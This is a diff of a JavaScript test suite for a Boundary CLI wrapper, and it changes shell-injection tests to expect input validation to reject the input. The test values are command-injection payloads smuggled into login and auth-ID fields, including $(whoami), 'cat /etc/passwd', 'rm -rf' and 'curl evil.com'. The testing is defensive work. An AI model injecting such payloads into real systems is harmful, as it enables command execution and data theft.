@@ -215,175 +215,79 @@ describe('BoundaryCLI', () => {
     describe('shell metacharacter injection in arguments', () => {
       // Note: listAuthMethods, listScopes, listTargets, and authorizeSession now use the HTTP API
       // instead of CLI. These tests focus on CLI-based methods (authenticate, getToken, connect).
+      // Validation now rejects malicious input before it reaches the CLI.
 
-      it('should not execute command substitution with $() in auth method ID', async () => {
+      it('should reject command substitution with $() in auth method ID', async () => {
         const maliciousAuthMethodId = 'ampw_test$(whoami)';
 
-        // Mock successful execution
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: maliciousAuthMethodId,
+          loginName: 'testuser',
+          password: 'password123',
+        })).rejects.toThrow('Invalid auth method ID format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: maliciousAuthMethodId,
-            loginName: 'testuser',
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable, injection should not happen
-        }
-
-        // Verify execFile was called (secure implementation)
-        expect(mockExecFileAsync).toHaveBeenCalled();
-
-        // Get the arguments that were passed
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const cliPath = callArgs[0];
-        const argsArray = callArgs[1];
-
-        // Arguments should be passed as array (prevents shell interpretation)
-        expect(Array.isArray(argsArray)).toBe(true);
-        // The malicious string should be passed as a literal argument
-        expect(argsArray).toContain(maliciousAuthMethodId);
-        // Verify not using string concatenation
-        expect(typeof cliPath).toBe('string');
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should not execute command substitution with backticks in auth method ID', async () => {
+      it('should reject command substitution with backticks in auth method ID', async () => {
         const maliciousAuthMethodId = 'ampw_test`id`';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: maliciousAuthMethodId,
+          loginName: 'testuser',
+          password: 'password123',
+        })).rejects.toThrow('Invalid auth method ID format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: maliciousAuthMethodId,
-            loginName: 'testuser',
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Arguments passed as array - backticks are literal
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousAuthMethodId);
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should not interpret semicolon as command separator in login name', async () => {
+      it('should reject semicolon as command separator in login name', async () => {
         const maliciousLoginName = 'user; rm -rf /tmp/test';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Semicolon is treated as literal part of argument
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousLoginName);
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should not interpret pipe as command chaining in login name', async () => {
+      it('should reject pipe as command chaining in login name', async () => {
         const maliciousLoginName = 'user | cat /etc/passwd';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Pipe is treated as literal part of argument
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousLoginName);
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should not execute redirect operators in auth method ID', async () => {
+      it('should reject redirect operators in auth method ID', async () => {
         const maliciousId = 'ampw_test > /tmp/pwned';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: maliciousId,
+          loginName: 'testuser',
+          password: 'password123',
+        })).rejects.toThrow('Invalid auth method ID format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: maliciousId,
-            loginName: 'testuser',
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Redirect operators are literal
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousId);
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should not execute ampersand background operator in login name', async () => {
+      it('should reject ampersand background operator in login name', async () => {
         const maliciousLoginName = 'user & curl evil.com';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Ampersand is literal
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousLoginName);
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
@@ -459,34 +363,17 @@ describe('BoundaryCLI', () => {
         expect(argsArray.join(' ')).not.toContain(maliciousPassword);
       });
 
-      it('should handle special characters in login name safely', async () => {
+      it('should reject special characters in login name via validation', async () => {
         const maliciousLoginName = 'admin$(curl evil.com)';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({
-            token: 'test-token',
-            status: 'success',
-          }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_test',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_test',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-
-        // Login name should be passed as literal argument (no shell interpretation)
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
@@ -495,32 +382,17 @@ describe('BoundaryCLI', () => {
       // instead of CLI. Input validation for these is tested in api.test.ts.
       // The following tests verify CLI-based methods handle malicious input safely.
 
-      it('should handle malicious auth method IDs in authenticate', async () => {
+      it('should reject malicious auth method IDs in authenticate via validation', async () => {
         const maliciousAuthMethodId = 'ampw_$(whoami)';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({
-            token: 'test-token',
-            status: 'success',
-          }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: maliciousAuthMethodId,
+          loginName: 'testuser',
+          password: 'password123',
+        })).rejects.toThrow('Invalid auth method ID format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: maliciousAuthMethodId,
-            loginName: 'testuser',
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        const argsArray = callArgs[1];
-        expect(Array.isArray(argsArray)).toBe(true);
-        expect(argsArray).toContain(maliciousAuthMethodId);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
@@ -555,37 +427,18 @@ describe('BoundaryCLI', () => {
         // which prevents shell interpretation of special characters
       });
 
-      it('should pass malicious input as literal argument in authenticate (secure)', async () => {
-        // This test verifies the FIXED implementation handles malicious input safely
+      it('should reject malicious login name in authenticate via validation (secure)', async () => {
+        // Validation now rejects malicious input before CLI is called
         const maliciousLoginName = 'testuser$(whoami)';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-
-        // When execFile is called with argument array:
-        // - First arg: executable path (string)
-        // - Second arg: array of arguments (NOT concatenated string)
-        // - Third arg: options
-        expect(typeof callArgs[0]).toBe('string');
-        expect(Array.isArray(callArgs[1])).toBe(true);
-
-        // The malicious input is treated as literal text, not shell command
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
@@ -615,131 +468,75 @@ describe('BoundaryCLI', () => {
     });
 
     describe('null byte injection', () => {
-      it('should handle null bytes in arguments', async () => {
+      it('should reject null bytes in arguments via validation', async () => {
         const maliciousLoginName = 'test\x00-ignored';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        expect(Array.isArray(callArgs[1])).toBe(true);
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
     describe('newline injection', () => {
-      it('should handle newlines in arguments', async () => {
+      it('should reject newlines in arguments via validation', async () => {
         const maliciousLoginName = 'test\ncurl evil.com';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        expect(Array.isArray(callArgs[1])).toBe(true);
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
     describe('glob pattern injection', () => {
-      it('should handle glob patterns in arguments', async () => {
+      it('should reject glob patterns in arguments via validation', async () => {
         const maliciousLoginName = 'test*';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        expect(Array.isArray(callArgs[1])).toBe(true);
-        // Glob is passed as literal, not expanded
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
 
     describe('unicode and encoding attacks', () => {
-      it('should handle unicode characters in arguments', async () => {
+      it('should reject unicode control characters in arguments via validation', async () => {
         const maliciousLoginName = 'test\u0000\u0001\u0002';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        expect(Array.isArray(callArgs[1])).toBe(true);
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
 
-      it('should handle ANSI escape sequences in arguments', async () => {
+      it('should reject ANSI escape sequences in arguments via validation', async () => {
         const maliciousLoginName = 'test\x1b[0m\x1b[31m';
 
-        mockExecFileAsync.mockResolvedValueOnce({
-          stdout: JSON.stringify({ token: 'test', status: 'success' }),
-          stderr: '',
-        });
+        await expect(cli.authenticate('password', {
+          authMethodId: 'ampw_123',
+          loginName: maliciousLoginName,
+          password: 'password123',
+        })).rejects.toThrow('Invalid login name format');
 
-        try {
-          await cli.authenticate('password', {
-            authMethodId: 'ampw_123',
-            loginName: maliciousLoginName,
-            password: 'password123',
-          });
-        } catch (error) {
-          // Error is acceptable
-        }
-
-        expect(mockExecFileAsync).toHaveBeenCalled();
-        const callArgs = mockExecFileAsync.mock.calls[0];
-        expect(Array.isArray(callArgs[1])).toBe(true);
-        expect(callArgs[1]).toContain(maliciousLoginName);
+        // Validation rejects before CLI is called
+        expect(mockExecFileAsync).not.toHaveBeenCalled();
       });
     });
   });
